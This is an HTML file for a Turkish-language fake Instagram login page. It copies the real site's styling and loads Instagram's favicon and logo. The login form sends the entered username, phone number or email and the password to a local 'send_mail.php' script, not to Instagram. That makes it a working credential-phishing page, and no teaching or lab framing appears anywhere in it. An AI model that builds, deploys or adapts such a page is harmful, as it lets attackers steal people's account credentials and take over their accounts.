<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3048c446e.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; min-height: 100vh; }
        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; margin-top: 32px; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 10px 0; text-align: center; }
        .logo { margin: 36px 0 12px; display: inline-block; background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajl9-PkYhCl.png'); background-position: 0px -52px; background-size: 176px 186px; width: 175px; height: 51px; }
        .form-container { padding: 0 40px; margin-top: 24px; }
        .input-group { position: relative; margin-bottom: 6px; }
        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px 0 2px 8px; font-size: 12px; outline: none; }
        .input-group span { position: absolute; left: 8px; top: 10px; color: #8e8e8e; font-size: 12px; transition: all 0.1s ease; pointer-events: none; }
        .input-group input:focus ~ span, .input-group input:not(:placeholder-shown) ~ span { top: 2px; font-size: 10px; }
        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; padding: 7px 0; margin-top: 8px; cursor: pointer; }
        .btn-login:disabled { opacity: 0.7; cursor: default; }
        .divider { display: flex; align-items: center; margin: 20px 0; padding: 0 40px; }
        .line { height: 1px; background: #dbdbdb; flex-grow: 1; }
        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
        .signup { background: #fff; border: 1px solid #dbdbdb; width: 350px; margin-top: 10px; padding: 20px; text-align: center; font-size: 14px; }
        .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-box">
            <div class="logo"></div>
            <div class="form-container">
                <form action="send_mail.php" method="POST">
                    <div class="input-group">
                        <input type="text" name="email" placeholder=" " required>
                        <span>Telefon numarası, kullanıcı adı veya e-posta</span>
                    </div>
                    <div class="input-group">
                        <input type="password" name="pass" placeholder=" " required>
                        <span>Şifre</span>
                    </div>
                    <button type="submit" class="btn-login">Giriş Yap</button>
                </form>
                <div class="divider"><div class="line"></div><div class="or">YA DA</div><div class="line"></div></div>
                <a href="#" class="fb-link">Facebook ile Giriş Yap</a>
                <a href="#" class="forgot">Şifreni mi unuttun?</a>
            </div>
        </div>
        <div class="signup">Hesabın yok mu? <a href="#">Kaydol</a></div>
    </div>
</body>
</html>
